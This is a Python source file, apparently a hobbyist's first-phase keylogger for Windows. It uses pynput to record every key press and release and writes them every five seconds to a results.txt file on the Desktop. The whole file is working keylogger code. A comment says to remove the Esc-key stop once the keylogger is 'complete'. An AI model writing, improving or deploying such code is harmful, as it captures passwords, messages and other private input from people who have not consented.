# Phase 1: Building the keylogger script
# Description & features: 
# The keylogger works specially with focus on Windows using a path for store in a .txt file
# all the inputs of the user

#bug 1:
# the overflow gives a repeated input on the .txt file

import logging #used to log the keystrokes to a file
import os #use to handle files or paths
from threading import Thread, Lock #for run multiple threat
from pynput.keyboard import Key, Listener as KeyboardListener #for listen all the inputs of the keyboard
import time #for delay


#Specify the dir and file of the log file
directory = os.path.join(os.path.expanduser("~"), "Desktop") #Open this path
#expanduser("~") is fot expand the current user's home dir where the scrip
#For be specific C:\Users\Public or PrivateU\Desktop or other folder
#OR choose whatever path u want :)

filename = "results.txt" #name of the file
path = os.path.join (directory, filename)

#configure a basic config
logging.basicConfig(
    filename = path, #this specifies the file where the logs will saved
    level = logging.INFO, #setting the level of the file: "Info level"
    format = "%(message)s" #format how the messages will displayed "date/message"
)

#global functions for buffering
keystroke_buffer = [] 
buffer_lock = Lock() #to ensure thread-safe access to the buffer
logging_interval = 5 #log every 5 seconds

def press_key(key):
    with buffer_lock:
        keystroke_buffer.append(f"K.Pressed: {key}")

def release(key): #function in case any key is released
    with buffer_lock:    
        keystroke_buffer.append(f"K.Released: {key}") #logs of a released key to the file

    #delete this when the keylogger is complete
    if key == Key.esc: #If esc key is pressed the keylogger will stop
        return False

def log_keystrokes():
    while True:
        time.sleep(logging_interval)
        with buffer_lock:
            if keystroke_buffer:
                for keystroke in keystroke_buffer:
                    logging.info(keystroke)
                keystroke_buffer.clear()

def start_listener(): 
    try:
        with KeyboardListener(on_press=press_key, on_release=release) as listener: #calls the functions
            logging_thread = Thread(target=log_keystrokes, daemon=True)
            logging_thread.start()
            listener.join() #it keeps the listener running until it's stopped

    except Exception as e: #handling possible errors
        logging.error(f"Error in listener: {e}")

keyboard_thread = Thread(target=start_listener)#thread for keyboard

keyboard_thread.start()#starting thread
